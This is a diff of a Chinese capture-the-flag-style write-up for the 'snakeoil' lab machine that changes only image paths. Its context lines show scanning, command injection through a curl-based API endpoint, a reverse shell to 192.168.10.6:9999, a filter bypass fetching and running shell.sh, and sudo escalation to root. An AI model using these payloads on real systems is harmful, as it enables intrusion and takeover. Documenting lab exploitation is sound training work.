@@ -16,7 +16,7 @@
 
 也可以使用`nmap`等工具进行
 
-![](pic-snakeoil\1.jpg)
+![](./pic-snakeoil/1.jpg)
 
 # 信息收集
 
@@ -28,7 +28,7 @@
 nmap -sT 192.168.10.11 --min-rate=1000 -p- -oA nmap-tcp
 ```
 
-![](pic-snakeoil\2.jpg)
+![](./pic-snakeoil/2.jpg)
 
 扫描常见的20个`udp`端口，不过这里的端口明显处于`open`的很少
 
@@ -36,7 +36,7 @@ nmap -sT 192.168.10.11 --min-rate=1000 -p- -oA nmap-tcp
 nmap -sU 192.168.10.11 --top-ports 20 -T4 -oA nmap-udp
 ```
 
-![](pic-snakeoil\3.jpg)
+![](./pic-snakeoil/3.jpg)
 
 把前面扫描出的`tcp、udp`端口，进行处理，只取端口号
 
@@ -46,7 +46,7 @@ grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','
 ports=22,80,8080,68,69,138,161,631,1434,1900
 ```
 
-![](pic-snakeoil\4.jpg)
+![](./pic-snakeoil/4.jpg)
 
 对特定的端口号进行深入探测
 
@@ -54,7 +54,7 @@ ports=22,80,8080,68,69,138,161,631,1434,1900
 nmap -sV -O -sC -sT 192.168.10.11 -p $ports -oA detail
 ```
 
-![](pic-snakeoil\5.jpg)
+![](./pic-snakeoil/5.jpg)
 
 使用脚本检测有无漏洞
 
@@ -62,7 +62,7 @@ nmap -sV -O -sC -sT 192.168.10.11 -p $ports -oA detail
 nmap --script=vuln 192.168.10.11 -p $ports -oA vuln
 ```
 
-![](pic-snakeoil\6.jpg)
+![](./pic-snakeoil/6.jpg)
 
 
 
@@ -70,13 +70,13 @@ nmap --script=vuln 192.168.10.11 -p $ports -oA vuln
 
 访问80端口界面，应该是搭建成功的界面，访问页面源代码，并没有信息泄露
 
-![](pic-snakeoil\7.jpg)
+![](./pic-snakeoil/7.jpg)
 
 使用`whatweb`和浏览器插件`wappalyzer`进行分析
 
-![](pic-snakeoil\8.jpg)
+![](./pic-snakeoil/8.jpg)
 
-![9](pic-snakeoil\9.jpg)
+![9](./pic-snakeoil/9.jpg)
 
 使用`gobuster`等目录爆破工具进行测试
 
@@ -84,7 +84,7 @@ nmap --script=vuln 192.168.10.11 -p $ports -oA vuln
 gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.bak,.txt,s,.,.html -b 403-404
 ```
 
-![](pic-snakeoil\10.jpg)
+![](./pic-snakeoil/10.jpg)
 
 可以看到，扫描并未有内容出现
 
@@ -92,23 +92,23 @@ gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirbuster/directory
 
 查看页面源代码，也没有信息泄露
 
-![](pic-snakeoil\11.jpg)
+![](./pic-snakeoil/11.jpg)
 
 点击进行测试，访问`edit`，就是每个文章的编辑，发现有`delete post`的选项，并且点击后，可以直接就删除这个文章了
 
-![](pic-snakeoil\12.jpg)
+![](./pic-snakeoil/12.jpg)
 
 不过访问`house rules`时，也是发现了一个人名`patrick`
 
-![](pic-snakeoil\13.jpg)
+![](./pic-snakeoil/13.jpg)
 
 这里反应很慢，通过浏览器的网络功能，发现请求的`js`可能是来自国外的，所以建议这里自己使用魔法一下。
 
-![](pic-snakeoil\14.jpg)
+![](./pic-snakeoil/14.jpg)
 
 访问`useful links`，发现其中提到`JWT`认证
 
-![](pic-snakeoil\15.jpg)
+![](./pic-snakeoil/15.jpg)
 
 使用`gobuster`目录爆破工具，针对`8080`端口的网站进行目录爆破
 
@@ -116,23 +116,23 @@ gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirbuster/directory
 gobuster dir -u http://192.168.10.11:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.bak,.txt,.sh,.html -b 403-404
 ```
 
-![](pic-snakeoil\16.jpg)
+![](./pic-snakeoil/16.jpg)
 
 访问`login`界面，提示当前的`get`方式不行，并且服务器给出回应，可用的方式有两个
 
-![](pic-snakeoil\17.jpg)
+![](./pic-snakeoil/17.jpg)
 
 那么建议使用`burp`或者`yakit`抓包吧，更改请求类型后，还是没什么东西。改为`post`还有内容，但是`options`后，没有任何东西
 
-![](pic-snakeoil\18.jpg)
+![](./pic-snakeoil/18.jpg)
 
 访问同样是`405`状态码的`run`，这个更改为`post`后，给出了返回，也就是应该有一个`form`表单，这个表单中输入`url`，其实就是需要知道参数。这个没办法
 
-![](pic-snakeoil\19.jpg)
+![](./pic-snakeoil/19.jpg)
 
 访问`users`，发现东西了，这里就是出现用户名和密码了
 
-![](pic-snakeoil\20.jpg)
+![](./pic-snakeoil/20.jpg)
 
 
 
@@ -165,11 +165,11 @@ $pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CG
 
 这里是返回提示“错误的方法”
 
-![](pic-snakeoil\21.jpg)
+![](./pic-snakeoil/21.jpg)
 
 那么采用POST方式后，提示`username`区域为空
 
-![](pic-snakeoil\22.jpg)
+![](./pic-snakeoil/22.jpg)
 
 一般对于`registration`都是注册，假设这里一样呢，因为也涉及到用户名。
 
@@ -177,11 +177,11 @@ $pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CG
 
 这里建议从`burp`的右侧界面进行添加，因为这样`burp`会自动加上`Content-type`请求体的
 
-![](pic-snakeoil\23.jpg)
+![](./pic-snakeoil/23.jpg)
 
 这里提示`password`参数也没有数据，所以再添加数据`password`
 
-![](pic-snakeoil\24.jpg)
+![](./pic-snakeoil/24.jpg)
 
 根据返回数据来看，已经成功， 让访问`login`的`api`进行登录，并且给出了一个`token`值，这个肯定有用
 
@@ -193,7 +193,7 @@ $pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CG
 
 修改请求方式为`POST`，然后点击后，所需参数与注册时一样，就直接截图参数到位的图片
 
-![](pic-snakeoil\25.jpg)
+![](./pic-snakeoil/25.jpg)
 
 但是这里登录成功，并没有跳转，所以可能就到这里，还有一个`run`，访问它
 
@@ -201,19 +201,19 @@ $pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CG
 
 但是这里的返回并没有参数，该怎么办呢，仔细观察，或许这是`json`的形式进行传递的
 
-![](pic-snakeoil\26.jpg)
+![](./pic-snakeoil/26.jpg)
 
 以`json`数据在请求体中进行测试，不过直接测试`127.0.0.1:80`后，无效果
 
-![](pic-snakeoil\27.jpg)
+![](./pic-snakeoil/27.jpg)
 
 说明还是有一个所谓的参数，一直说提供`url`，是否参数就是`url`呢，测试一下，当然形式上都测试一下，先测试表单的请求，可以看到不行
 
-![](pic-snakeoil\28.jpg)
+![](./pic-snakeoil/28.jpg)
 
 直接使用`burp`的扩展，更改为`json`形式
 
-![](pic-snakeoil\29.jpg)
+![](./pic-snakeoil/29.jpg)
 
 返回不一样了，这里要一个密钥，综合来说，目前密钥的形式可能有`patrick`的哈希密码。以及注册用户`snake`给的一个`access_token`，不过这里进行`login`时，是使用注册的用户`snake`，是否需要的就是这个`access_token`呢。
 
@@ -225,11 +225,11 @@ $pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CG
 
 根据名称联想，之前的目录`secret`还没测试，访问测试一下，直接500
 
-![](pic-snakeoil\30.jpg)
+![](./pic-snakeoil/30.jpg)
 
 内部服务器问题？这里目前有的只有`access_token`以及账户密码，尝试添加`access_token`测试能否访问
 
-![](pic-snakeoil\31.jpg)
+![](./pic-snakeoil/31.jpg)
 
 还是不行，这不应该啊，我测试多次，无奈，看了一下`wp`。
 
@@ -237,11 +237,11 @@ $pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CG
 
 唉，访问成功，获取到`secret_key`的值`commandexecutionissecret`
 
-![](pic-snakeoil\32.jpg)
+![](./pic-snakeoil/32.jpg)
 
 直接在`run`中的`json`数据，再添加以一段即可
 
-![](pic-snakeoil\33.jpg)
+![](./pic-snakeoil/33.jpg)
 
 ###### 命令执行
 
@@ -251,11 +251,11 @@ $pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CG
 
 并且，这里返回中，说不能解析主机`id`，采用的是`curl`
 
-![](pic-snakeoil\35.jpg)
+![](./pic-snakeoil/35.jpg)
 
 我是否可以猜测，这其实是一个`curl`命令语句，经测试就是类似于这种
 
-![](pic-snakeoil\36.jpg)
+![](./pic-snakeoil/36.jpg)
 
 所以在`burp`上再测试，发现直接在引号内输入`;id`是不行的，可能在某些符合内吧。想到可以使用反引号 ` `` `这个可以执行的
 
@@ -264,7 +264,7 @@ $pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CG
 "secret_key":"commandexecutionissecret"
 ```
 
-![](pic-snakeoil\37.jpg)
+![](./pic-snakeoil/37.jpg)
 
 相当于可以命令执行，并且这个返回其实可以搞掉，因为是正确的返回，那么直接给它`2>/dev/null`。
 
@@ -276,7 +276,7 @@ bash -i >& /dev/tcp/192.168.10.6/9999 0>&1
 
 然后通过这个把其下载，根据`curl`的命令，加上`-O`参数即可，这里也测试过`php`文件，但是对`php`进行关键字处理了
 
-![](pic-snakeoil\38.jpg)
+![](./pic-snakeoil/38.jpg)
 
 想办法执行执行这个脚本，测试过，命令执行不能有空格，也就是单个命令可以
 
@@ -288,7 +288,7 @@ bash -i >& /dev/tcp/192.168.10.6/9999 0>&1
 "http://192.168.10.6:8888/shell.sh -O;`a='bas';b='h';$a$b shell.sh`",
 ```
 
-![](pic-snakeoil\39.jpg)
+![](./pic-snakeoil/39.jpg)
 
 
 
@@ -298,9 +298,9 @@ bash -i >& /dev/tcp/192.168.10.6/9999 0>&1
 
 大致情况如下，基本上差不多
 
-![](pic-snakeoil\40.jpg)
+![](./pic-snakeoil/40.jpg)
 
-![26](pic-snakeoil\41.jpg)
+![26](./pic-snakeoil/41.jpg)
 
 这里就放两张图，不过一定要注意，`postman`与`burp`是不同的，这里使用这个工具也是提醒自己
 
@@ -315,7 +315,7 @@ ls -l /home
 cat /etc/passwd | grep /bin/bash
 ```
 
-![](pic-snakeoil\42.jpg)
+![](./pic-snakeoil/42.jpg)
 
 查看网络连接状态
 
@@ -325,7 +325,7 @@ ss -antulp
 netstat -antulp
 ```
 
-![](pic-snakeoil\43.jpg)
+![](./pic-snakeoil/43.jpg)
 
 查看内核版本和系统版本
 
@@ -337,7 +337,7 @@ cat /etc/*release
 lsb_release
 ```
 
-![](pic-snakeoil\44.jpg)
+![](./pic-snakeoil/44.jpg)
 
 查看以`root`执行的进程
 
@@ -354,23 +354,23 @@ find / -perm \o+w 2>/dev/null
 find / -perm -4000 -print 2>/dev/null
 ```
 
-![](pic-snakeoil\45.jpg)
+![](./pic-snakeoil/45.jpg)
 
 使用`sudo -l`查看，发现两个，一个以`root`执行无需密码的`shutdown`，一个是需要密码，所有都可以
 
 但是这里不知道`patrick`的密码
 
-![](pic-snakeoil\46.jpg)
+![](./pic-snakeoil/46.jpg)
 
 查看由`python`搭建的`flask`网站配置，该配置文件就在`patrick`的家目录下，路径为`/home/patrick/flask_blog`
 
 查看主文件`app.py`，发现几个可能是密码的东西
 
-![](pic-snakeoil\47.jpg)
+![](./pic-snakeoil/47.jpg)
 
 当然这个文件中，还涉及到一些防护，是真的对`bash`等关键字进行防护了
 
-![](pic-snakeoil\48.jpg)
+![](./pic-snakeoil/48.jpg)
 
 尝试以获取的密码进行登录测试
 
@@ -381,7 +381,7 @@ NOreasonableDOUBTthisPASSWORDisGOOD
 
 最终以密码`NOreasonableDOUBTthisPASSWORDisGOOD`登录了`patrick`账户
 
-![](pic-snakeoil\49.jpg)
+![](./pic-snakeoil/49.jpg)
 
 # 提权
 
@@ -391,11 +391,11 @@ NOreasonableDOUBTthisPASSWORDisGOOD
 sudo /bin/bash -p
 ```
 
-![](pic-snakeoil\50.jpg)
+![](./pic-snakeoil/50.jpg)
 
 查看`root`主目录下的文件
 
-![](pic-snakeoil\51.jpg)
+![](./pic-snakeoil/51.jpg)
 
 
 
